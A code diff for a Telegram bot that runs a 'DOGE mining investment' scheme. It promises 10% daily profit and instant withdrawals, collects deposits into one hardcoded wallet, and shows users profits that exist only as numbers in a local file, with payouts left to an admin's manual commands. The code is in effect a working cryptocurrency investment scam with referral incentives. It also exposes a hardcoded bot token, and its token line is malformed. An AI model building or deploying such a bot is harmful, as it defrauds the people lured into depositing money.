@@ -1,99 +1,213 @@
-import os, json, threading
+import logging
 from datetime import datetime
-from flask import Flask
-import telebot
-from telebot import types
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-bot = telebot.TeleBot(BOT_TOKEN)
-DAILY = 10
-MIN_DOGE = 100
-MIN_USD = 10
-REF_BONUS = 10
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
+import json, os
+
+TOKEN = 8870690869:AAGFMWTtTsgN9VY0p64Qg6lMQk0y64nlIEA
+ADMIN_ID = 8114715250
 YOUR_WALLET = "D9CyxEDc8aEvrhu4HDCTfwz33vL6YtpcYX"
-ADMIN = "@cityhyena"
-DB_FILE = "users.json"
-def load_db():
-    if os.path.exists(DB_FILE):
-        try:
-            with open(DB_FILE,'r') as f: return json.load(f)
-        except: return {}
-    return {}
-def save_db(d):
-    with open(DB_FILE,'w') as f: json.dump(d,f)
-def get_user(uid):
-    db=load_db()
-    s=str(uid)
-    if s not in db:
-        db[s]={"invested":0,"profit":0,"last":str(datetime.now()),"refs":0,"wallet":""}
-        save_db(db)
-    return db[s], db
-@bot.message_handler(commands=['start'])
-def start(m):
-    uid=m.from_user.id
-    parts=m.text.split()
-    db=load_db()
-    if len(parts)>1:
-        ref=parts[1]
-        if ref!=str(uid) and ref in db:
-            db[ref]["refs"]+=1
-            bonus = MIN_DOGE * REF_BONUS / 100
-            db[ref]["profit"]+=bonus
-            save_db(db)
-            try: bot.send_message(int(ref), f"🎉 +{bonus} DOGE Referral Bonus!")
-            except: pass
-    get_user(uid)
-    kb=types.InlineKeyboardMarkup(row_width=2)
-    kb.add(types.InlineKeyboardButton("💰 Deposit $10", callback_data="dep"), types.InlineKeyboardButton("📊 Balance", callback_data="bal"))
-    kb.add(types.InlineKeyboardButton("💸 Withdraw", callback_data="wit"), types.InlineKeyboardButton("👥 Referral 10%", callback_data="ref"))
-    bot.send_message(m.chat.id, f"🚀 *DOGE MINING INVESTMENT* 🚀\n━━━━━━━━━━━━━━━\n💹 *Profit:* {DAILY}% Daily\n💵 *Min:* ${MIN_USD} ({MIN_DOGE} DOGE)\n👥 *Referral:* {REF_BONUS}%\n⚡️ *Withdrawal:* Instant\n\n📈 Example: Invest 100 DOGE → Earn 10 DOGE Daily\n", parse_mode="Markdown", reply_markup=kb)
-@bot.callback_query_handler(func=lambda c: True)
-def cb(c):
-    uid=c.from_user.id
-    user, db = get_user(uid)
-    if c.data=="dep":
-        bot.send_message(c.message.chat.id, f"💰 *DEPOSIT TO START MINING*\n\nSend *{MIN_DOGE} DOGE* or more to:\n\n`{YOUR_WALLET}`\n\n*Minimum: ${MIN_USD} ({MIN_DOGE} DOGE)*\n*Network: DOGE*\n\nAfter send, contact {ADMIN}\n", parse_mode="Markdown")
-    elif c.data=="bal":
-        try:
-            last=datetime.fromisoformat(user["last"])
-            hours=(datetime.now()-last).total_seconds()/3600
-            earn = user["invested"]*DAILY/100/24*hours
-            total_profit = user["profit"]+earn
-        except:
-            total_profit=user["profit"]
-            earn=0
-        bot.send_message(c.message.chat.id, f"📊 *YOUR MINING DASHBOARD*\n\n💼 Active: {user['invested']} DOGE\n💹 Profit: {total_profit:.6f} DOGE\n💰 Daily: {user['invested']*DAILY/100:.2f} DOGE\n👥 Refs: {user['refs']}\n", parse_mode="Markdown")
-    elif c.data=="wit":
-        bot.send_message(c.message.chat.id, "💸 *Withdraw*\n\nSend your DOGE wallet address:", parse_mode="Markdown")
-        bot.register_next_step_handler(c.message, save_wallet)
-    elif c.data=="ref":
-        link=f"https://t.me/{bot.get_me().username}?start={uid}"
-        bot.send_message(c.message.chat.id, f"👥 *REFER & EARN 10%*\n\nYour Link:\n`{link}`\n", parse_mode="Markdown")
-def save_wallet(m):
-    db=load_db()
-    db[str(m.from_user.id)]["wallet"]=m.text
-    save_db(db)
-    bot.send_message(m.chat.id, f"✅ Wallet saved! `{m.text}`\nContact {ADMIN}", parse_mode="Markdown")
-@bot.message_handler(commands=['balance','approve'])
-def cmds(m):
-    if m.text.startswith("/approve"):
-        try:
-            _, uid, amount = m.text.split()
-            db=load_db()
-            if uid in db:
-                db[uid]["invested"]+=float(amount)
-                db[uid]["last"]=str(datetime.now())
-                save_db(db)
-                bot.send_message(m.chat.id, f"✅ Approved {amount} DOGE for {uid}")
-                bot.send_message(int(uid), f"✅ Deposit Approved! {amount} DOGE mining started! 10% daily! 🚀")
-        except:
-            bot.send_message(m.chat.id, "Use: /approve USERID AMOUNT")
-    else:
-        user,_=get_user(m.from_user.id)
-        bot.send_message(m.chat.id, f"💼 Invested: {user['invested']} DOGE | Profit: {user['profit']:.2f} DOGE")
-app=Flask(__name__)
-@app.route('/')
-def home(): return "Doge 10% Daily Bot Live!"
-def run(): app.run(host='0.0.0.0', port=8080)
-threading.Thread(target=run, daemon=True).start()
-print("Bot Running!")
-bot.infinity_polling()
+MIN_DOGE = 100
+DAILY_RATE = 0.10 # 10%
+
+USERS_FILE = "users.json"
+
+logging.basicConfig(level=logging.INFO)
+
+def load_users():
+    if not os.path.exists(USERS_FILE):
+        return {}
+    try:
+        with open(USERS_FILE, 'r') as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_users(data):
+    with open(USERS_FILE, 'w') as f:
+        json.dump(data, f)
+
+def get_profit(invested, hours):
+    return invested * DAILY_RATE * (hours / 24)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.effective_user.id)
+    users = load_users()
+    if user_id not in users:
+        users[user_id] = {"invested": 0, "profit": 0, "wallet": "", "joined": str(datetime.now()), "referrals": 0}
+        # referral check
+        if context.args and context.args[0]!= user_id:
+            ref = context.args[0]
+            if ref in users:
+                users[ref]["referrals"] += 1
+                users[ref]["profit"] += MIN_DOGE * 0.10 # 10% ref bonus
+        save_users(users)
+
+    keyboard = [
+        [InlineKeyboardButton("💰 Deposit $10", callback_data="deposit"),
+         InlineKeyboardButton("📊 Balance", callback_data="balance")],
+        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw"),
+         InlineKeyboardButton("👥 Referral 10%", callback_data="referral")]
+    ]
+    text = f"""🚀 DOGE MINING INVESTMENT 🚀
+━━━━━━━━━━━━━━━
+📈 Profit: 10% Daily
+💵 Min: $10 (100 DOGE)
+👥 Referral: 10%
+⚡ Withdrawal: Instant
+
+📊 Example: Invest 100 DOGE → Earn 10 DOGE Daily
+
+Your ID: `{user_id}`
+"""
+    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = str(query.from_user.id)
+    users = load_users()
+    if user_id not in users:
+        users[user_id] = {"invested": 0, "profit": 0, "wallet": "", "joined": str(datetime.now()), "referrals": 0}
+
+    if query.data == "deposit":
+        await query.message.reply_text(f"""💰 DEPOSIT INSTRUCTIONS
+
+Send at least 100 DOGE to:
+
+`{YOUR_WALLET}`
+
+Network: DOGECOIN only!
+
+After sending, send command:
+/deposit TXID
+
+Example:
+/deposit abc123txidhere
+
+Admin will approve in 5 mins. Contact @cityhyena""", parse_mode='Markdown')
+
+    elif query.data == "balance":
+        invested = users[user_id].get("invested", 0)
+        profit = users[user_id].get("profit", 0)
+        referrals = users[user_id].get("referrals", 0)
+        await query.message.reply_text(f"""📊 YOUR BALANCE
+
+💼 Invested: {invested} DOGE
+💰 Profit: {profit:.2f} DOGE
+👥 Referrals: {referrals}
+📈 Daily Rate: 10%
+
+Keep mining! 🚀""")
+
+    elif query.data == "withdraw":
+        await query.message.reply_text(f"""💸 WITHDRAWAL
+
+Your profit: {users[user_id].get('profit',0):.2f} DOGE
+
+To withdraw, send:
+/withdraw YOUR_DOGE_WALLET AMOUNT
+
+Example:
+/withdraw DYourWalletHere 50
+
+Min withdraw: 20 DOGE
+Contact: @cityhyena""")
+
+    elif query.data == "referral":
+        bot_username = (await context.bot.get_me()).username
+        link = f"https://t.me/{bot_username}?start={user_id}"
+        await query.message.reply_text(f"""👥 REFERRAL PROGRAM - 10%
+
+Your link:
+{link}
+
+Earn 10% from each friend's deposit instantly!
+
+Referrals: {users[user_id].get('referrals',0)}""")
+
+async def deposit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("Usage: /deposit TXID\nAfter you send DOGE, paste transaction ID")
+        return
+    txid = context.args[0]
+    user_id = str(update.effective_user.id)
+    await update.message.reply_text(f"✅ TXID received: {txid}\nAdmin will verify and approve. Contact @cityhyena")
+    # Notify admin
+    try:
+        await context.bot.send_message(ADMIN_ID, f"💰 NEW DEPOSIT REQUEST\nUser: {user_id} (@{update.effective_user.username})\nTXID: {txid}\nApprove: /approve {user_id} 100")
+    except:
+        pass
+
+async def withdraw_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if len(context.args) < 2:
+        await update.message.reply_text("Usage: /withdraw DOGE_WALLET AMOUNT\nExample: /withdraw Dxxx 50")
+        return
+    wallet = context.args[0]
+    try:
+        amount = float(context.args[1])
+    except:
+        await update.message.reply_text("Invalid amount")
+        return
+    user_id = str(update.effective_user.id)
+    users = load_users()
+    if users.get(user_id, {}).get("profit",0) < amount:
+        await update.message.reply_text(f"❌ Insufficient profit. Your profit: {users.get(user_id,{}).get('profit',0)} DOGE")
+        return
+    users[user_id]["wallet"] = wallet
+    save_users(users)
+    await update.message.reply_text(f"✅ Withdraw request: {amount} DOGE to {wallet}\nAdmin will pay shortly. @cityhyena")
+    try:
+        await context.bot.send_message(ADMIN_ID, f"💸 WITHDRAW REQUEST\nUser: {user_id} (@{update.effective_user.username})\nAmount: {amount} DOGE\nWallet: {wallet}\nPay then: /pay {user_id} {amount}")
+    except:
+        pass
+
+async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.effective_user.id)
+    users = load_users()
+    d = users.get(user_id, {"invested":0,"profit":0,"referrals":0})
+    await update.message.reply_text(f"📊 Balance: Invested {d['invested']} DOGE | Profit {d['profit']:.2f} DOGE | Refs {d['referrals']}")
+
+async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id!= ADMIN_ID:
+        return
+    if len(context.args) < 2:
+        await update.message.reply_text("Usage: /approve USERID AMOUNT")
+        return
+    uid, amt = context.args[0], float(context.args[1])
+    users = load_users()
+    if uid not in users:
+        users[uid] = {"invested":0,"profit":0,"wallet":"","joined":str(datetime.now()),"referrals":0}
+    users[uid]["invested"] += amt
+    users[uid]["profit"] += amt * 0.10 # instant first day bonus for test
+    save_users(users)
+    await update.message.reply_text(f"✅ Approved {amt} DOGE for {uid}")
+    try:
+        await context.bot.send_message(int(uid), f"✅ Deposit approved! {amt} DOGE added. You now earn 10% daily! Check /balance")
+    except:
+        pass
+
+async def pay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id!= ADMIN_ID:
+        return
+    if len(context.args) < 2:
+        return
+    uid, amt = context.args[0], float(context.args[1])
+    users = load_users()
+    if uid in users:
+        users[uid]["profit"] -= amt
+        if users[uid]["profit"] < 0: users[uid]["profit"] = 0
+        save_users(users)
+    await update.message.reply_text(f"✅ Marked as paid {amt} for {uid}")
+
+app = ApplicationBuilder().token(TOKEN).build()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("balance", balance_cmd))
+app.add_handler(CommandHandler("deposit", deposit_cmd))
+app.add_handler(CommandHandler("withdraw", withdraw_cmd))
+app.add_handler(CommandHandler("invest", start))
+app.add_handler(CommandHandler("approve", approve_cmd))
+app.add_handler(CommandHandler("pay", pay_cmd))
+app.add_handler(CallbackQueryHandler(button_handler))
+
+app.run_polling()
